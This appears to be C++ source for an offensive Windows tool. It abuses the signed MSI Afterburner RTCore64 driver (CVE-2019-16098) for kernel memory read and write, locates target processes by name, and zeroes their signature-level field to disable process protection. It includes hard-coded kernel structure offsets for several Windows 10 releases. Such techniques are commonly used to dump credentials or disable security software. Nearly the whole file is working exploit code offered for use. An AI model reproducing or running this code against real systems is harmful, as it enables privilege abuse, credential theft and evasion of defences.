// CODE FROM
// https://github.com/Barakat/CVE-2019-16098
// https://github.com/gentilkiwi/mimikatz
// https://github.com/TarlogicSecurity/EoPLoadDriver/

#include <Windows.h>
#include <aclapi.h>
#include <tlhelp32.h>
#include <Psapi.h>
#include <cstdio>

#include <Shlobj.h>
#include <Shlobj_core.h>
#include <string_view>
#include <vector>
#include <string>

#define AUTHOR L"@aceb0nd"
#define VERSION L"0.3"

#if !defined(PRINT_ERROR_AUTO)
#define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
#endif

// Micro-Star MSI Afterburner driver arbitrary read and write primitive
// These signed drivers can also be used to bypass the Microsoft driver-signing policy to deploy malicious code.

namespace bypass {
    struct RTCORE64_MSR_READ {
        DWORD Register;
        DWORD ValueHigh;
        DWORD ValueLow;
    };
    static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

    struct RTCORE64_MEMORY_READ {
        BYTE Pad0[8];
        DWORD64 Address;
        BYTE Pad1[8];
        DWORD ReadSize;
        DWORD Value;
        BYTE Pad3[16];
    };
    static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

    struct RTCORE64_MEMORY_WRITE {
        BYTE Pad0[8];
        DWORD64 Address;
        BYTE Pad1[8];
        DWORD ReadSize;
        DWORD Value;
        BYTE Pad3[16];
    };
    static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

    struct Offsets {
        DWORD64 UniqueProcessIdOffset;
        DWORD64 ActiveProcessLinksOffset;
        DWORD64 TokenOffset;
        DWORD64 SignatureLevelOffset;
    };

    static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
    static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
    static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

    DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
        RTCORE64_MEMORY_READ MemoryRead{};
        MemoryRead.Address = Address;
        MemoryRead.ReadSize = Size;

        DWORD BytesReturned;

        DeviceIoControl(Device,
            RTCORE64_MEMORY_READ_CODE,
            &MemoryRead,
            sizeof(MemoryRead),
            &MemoryRead,
            sizeof(MemoryRead),
            &BytesReturned,
            nullptr);

        return MemoryRead.Value;
    }

    void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
        RTCORE64_MEMORY_READ MemoryRead{};
        MemoryRead.Address = Address;
        MemoryRead.ReadSize = Size;
        MemoryRead.Value = Value;

        DWORD BytesReturned;

        DeviceIoControl(Device,
            RTCORE64_MEMORY_WRITE_CODE,
            &MemoryRead,
            sizeof(MemoryRead),
            &MemoryRead,
            sizeof(MemoryRead),
            &BytesReturned,
            nullptr);
    }

    WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
        return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
    }

    DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
        return ReadMemoryPrimitive(Device, 4, Address);
    }

    DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
        return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
    }

    void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
        WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
        WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
    }

    void Log(const char* Message, ...) {
        const auto file = stderr;

        va_list Args;
        va_start(Args, Message);
        std::vfprintf(file, Message, Args);
        std::fputc('\n', file);
        va_end(Args);
    }

    unsigned long long getKernelBaseAddr() {
        DWORD out = 0;
        DWORD nb = 0;
        PVOID* base = NULL;
        if (EnumDeviceDrivers(NULL, 0, &nb)) {
            base = (PVOID*)malloc(nb);
            if (EnumDeviceDrivers(base, nb, &out)) {
                return (unsigned long long)base[0];
            }
        }
        return NULL;
    }

    std::vector<int> processPIDsByName(const std::wstring& name) {
        std::vector<int> pids;

        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) {
            PRINT_ERROR_AUTO(L"CreateToolhelp32Snapshot");
            return pids;
        }

        PROCESSENTRY32W pe32 = { 0 };
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        if (!Process32FirstW(snap, &pe32)) {
            PRINT_ERROR_AUTO(L"Process32First");
            CloseHandle(snap);
            return pids;
        }

        do {
            if (wcscmp(pe32.szExeFile, name.c_str()) == 0) {
                pids.push_back(pe32.th32ProcessID);
            }
        } while (Process32NextW(snap, &pe32));

        CloseHandle(snap);
        return pids;
    }

    void disableProtectedProcesses(DWORD targetPID, Offsets offsets) {
        const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (Device == INVALID_HANDLE_VALUE) {
            Log("[!] Unable to obtain a handle to the device object");
            return;
        }
        Log("[*] Device object handle has been obtained");

        const auto NtoskrnlBaseAddress = getKernelBaseAddr();
        Log("[*] Ntoskrnl base address: %p", NtoskrnlBaseAddress);

        HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
        const DWORD64 PsInitialSystemProcessOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsInitialSystemProcess")) - reinterpret_cast<DWORD64>(Ntoskrnl);
        FreeLibrary(Ntoskrnl);
        const DWORD64 PsInitialSystemProcessAddress = ReadMemoryDWORD64(Device, NtoskrnlBaseAddress + PsInitialSystemProcessOffset);
        Log("[*] PsInitialSystemProcess address: %p", PsInitialSystemProcessAddress);

        const DWORD64 TargetProcessId = static_cast<DWORD64>(targetPID);
        DWORD64 ProcessHead = PsInitialSystemProcessAddress + offsets.ActiveProcessLinksOffset;
        DWORD64 CurrentProcessAddress = ProcessHead;

        do {
            const DWORD64 ProcessAddress = CurrentProcessAddress - offsets.ActiveProcessLinksOffset;
            const auto UniqueProcessId = ReadMemoryDWORD64(Device, ProcessAddress + offsets.UniqueProcessIdOffset);
            if (UniqueProcessId == TargetProcessId) {
                break;
            }
            CurrentProcessAddress = ReadMemoryDWORD64(Device, ProcessAddress + offsets.ActiveProcessLinksOffset);
        } while (CurrentProcessAddress != ProcessHead);
        CurrentProcessAddress -= offsets.ActiveProcessLinksOffset;
        Log("[*] Current process address: %p", CurrentProcessAddress);

        WriteMemoryPrimitive(Device, 4, CurrentProcessAddress + offsets.SignatureLevelOffset, 0x00);

        CloseHandle(Device);
    }

    struct Offsets getVersionOffsets() {
        wchar_t value[255] = { 0 };
        DWORD BufferSize = sizeof(value);

        LSTATUS status = RegGetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);

        if (status != ERROR_SUCCESS) {
            wprintf(L"[!] Failed to read ReleaseId (Error %d)\n", status);
            exit(-1);
        }

        wprintf(L"[+] Windows Version %s Found\n", value);

        int winVer = _wtoi(value);

        switch (winVer) {
        case 1607:
            return Offsets{ 0x02e8, 0x02f0, 0x0358, 0x06c8 };
        case 1803:
        case 1809:
            return Offsets{ 0x02e0, 0x02e8, 0x0358, 0x06c8 };
        case 1903:
        case 1909:
            return Offsets{ 0x02e8, 0x02f0, 0x0360, 0x06f8 };
        case 2004:
        case 2009:
            return Offsets{ 0x0440, 0x0448, 0x04b8, 0x0878 };
        default:
            wprintf(L"[!] Version Offsets Not Found!\n");
            exit(-1);
        }
    }

    void EnabledBypass(const std::wstring& processName) {
        Offsets offsets = getVersionOffsets();
        auto pids = processPIDsByName(processName);
        if (pids.empty()) {
            Log("[ ! ] Process not found"); return;
        }

        const auto kernelBase = getKernelBaseAddr();
        if (kernelBase == 0) {
            Log("[!] Failed to get kernel base");
            return;
        }

        for (const auto pid : pids) {
            Log("[*] Disabling protections for PID: %d", pid);
            disableProtectedProcesses(pid, offsets);
        }
    }
}
